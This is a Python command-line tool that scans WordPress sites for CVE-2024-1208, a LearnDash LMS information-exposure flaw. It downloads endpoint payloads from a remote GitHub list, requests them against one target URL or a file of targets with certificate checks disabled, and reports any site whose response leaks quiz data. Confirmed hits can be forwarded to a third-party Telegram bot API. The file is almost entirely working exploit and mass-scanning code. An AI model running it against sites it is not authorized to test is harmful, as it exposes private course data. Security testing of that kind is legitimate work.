# -*- encoding: utf-8 -*-
'''
@File   : CVE-2024-1208.py
@Time   : 2024-06-05 16:07:56
@Author : pan
'''
import yaml
import click
import requests
import webbrowser
import os
from urllib3.exceptions import InsecureRequestWarning
from urllib.parse import quote
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def check_internet_connection():
    try:
        response = requests.get("http://www.google.com", timeout=5)
        return True
    except (requests.ConnectionError, requests.Timeout):
        return False

class Data:
    blog = 'https://blogs.cappriciosec.com/blog/137/CVE-2024-1208'
    api = 'https://api.cappriciosec.com/Telegram/cappriciosecbot.php'
    config_path = '~/.config/cappriciosec-tools/cappriciosec.yaml'
    payloadurl = 'https://raw.githubusercontent.com/Cappricio-Securities/PayloadAllTheThings/main/CVE-2024-1208.txt'
    bugname = "LearnDash LMS < 4.10.3 - Sensitive Information Exposure"

    rheaders = {
        "Tool-Name": "CVE-2024-1208",
        "Developed-by": "cappriciosec.com",
        "Contact-us": "contact@cappriciosec.com"
    }


class Colors:
    RED = '\x1b[31;1m'
    BLUE = '\x1b[34;1m'
    GREEN = '\x1b[32;1m'
    RESET = '\x1b[0m'
    MAGENTA = '\x1b[35;1m'

def new_chatid(chatid):
    yaml_file_path = os.path.expanduser(Data.config_path)
    folder_path = os.path.dirname(yaml_file_path)
    os.makedirs(folder_path, exist_ok=True)

    if not os.path.exists(yaml_file_path):
        initial_content = {"config": {"chatid": chatid}}
        with open(yaml_file_path, "w") as file:
            yaml.dump(initial_content, file, default_flow_style=False)
        print(f"Config file created at: {yaml_file_path}")

    else:
        with open(yaml_file_path, "r") as file:
            data = yaml.safe_load(file)
        if "config" in data and "chatid" in data["config"]:
            print(f"chatid is already present: {data['config']['chatid']}")
        else:
            data.setdefault("config", {})
            data["config"]["chatid"] = chatid
            with open(yaml_file_path, "w") as file:
                yaml.dump(data, file, default_flow_style=False)
            print(f"chatid appended to YAML file: {yaml_file_path}")


def check_id():
    yaml_file_path = os.path.expanduser(Data.config_path)
    try:
        with open(yaml_file_path, "r") as file:
            data = yaml.safe_load(file)
        if "config" in data and "chatid" in data["config"]:
            return "Exist"
        else:
            return "Null"
    except:
        print()


def writedata(output, data):
    with open(output, "a") as file:
        file.write(data)


def sendmessage(vul):
    data = {"Tname": "CVE-2024-1208", "chatid": get_chatid(), "data": vul,
            "Blog": Data.blog, "bugname": Data.bugname, "Priority": "Medium"}
    headers = {
        "Content-Type": "application/json",
    }
    try:
        response = requests.put(Data.api, json=data, headers=headers)
    except:
        print("Bot Error")


def reader(input, output):
    try:
        with open(input, 'r') as file:
            for line in file:
                cvescan(line.strip(), output)
    except FileNotFoundError:
        print("File not found. Check the file path and name.")


def cvescan(url, output):
    try:
        with requests.Session() as session:
            payreq = session.get(Data.payloadurl)
            for endpoint in payreq.text.splitlines():
                encode = quote(endpoint)
                if url.endswith('/'):
                    url = url[:-1]
                fullurl = f'{url}/{endpoint}'

                try:
                    response = session.get(
                        fullurl, verify=False, headers=Data.rheaders, allow_redirects=True)
                    print(f'Checking ===> {fullurl}')
                    if response.status_code == 200 and '"question_type":' in response.text and '"id":' in response.text and '"points_total":' in response.text:
                        outputprint = (
                            f"\n{Colors.RED}ðŸ’¸[Vulnerable]{Colors.RESET} ======> "
                            f"{Colors.BLUE}{url}{Colors.RESET} \n"
                            f"{Colors.MAGENTA}ðŸ“¸PoC-Url->{Colors.BLUE}${Colors.RESET} {fullurl}\n\n\n")

                        print(outputprint)
                        if check_id() == "Exist":
                            sendmessage(fullurl)
                        if output is not None:
                            writedata(output, str(f'{fullurl}\n'))
                        break

                except requests.exceptions.RequestException as e:
                    print(
                        f'{Colors.MAGENTA}Invalid Domain ->{Colors.BLUE}${Colors.RESET} {fullurl}: {e}')
    except requests.exceptions.RequestException as e:
        print(f"Check Network Connection: {e}")

def get_chatid():
    yaml_file_path = os.path.expanduser(Data.config_path)
    try:
        with open(yaml_file_path, "r") as file:
            data = yaml.safe_load(file)
        if "config" in data and "chatid" in data["config"]:
            chatid = data['config']['chatid']
            return chatid
        else:
            return "Null"
    except:
        print()


def helpbanner(ctx, params, value):
    if value:
        ctx.exit()


@click.command(context_settings=dict(help_option_names=['-h', '--help']))
@click.option('-u', '--url', type=str, help="URL to scan")
@click.option('-i', '--input', type=str, help="lost of input file")
@click.option('-o', '--output', type=str, help="output in text file")
@click.option('-c', '--chatid', type=str, help='Creating Telegram Notification')
@click.option('-b', '--blog', flag_value=True, help='Open Blog to read about Bug')
@click.option('-h', '--help', 'helpbanner', is_flag=True, expose_value=False, is_eager=True, callback=helpbanner, help="help menu")
def main(url, input, output, chatid, blog):
    if url:
        cvescan(url, output)

    if input:
        reader(input, output)

    if chatid:
        new_chatid(chatid)

    if blog:
        webbrowser.open(Data.blog)


if __name__ == "__main__":
    yaml_file_path = os.path.expanduser(Data.config_path)
    folder_path = os.path.dirname(yaml_file_path)
    os.makedirs(folder_path, exist_ok=True)
    if check_internet_connection():
        main()
    else:
        print("Check Internet Connection")
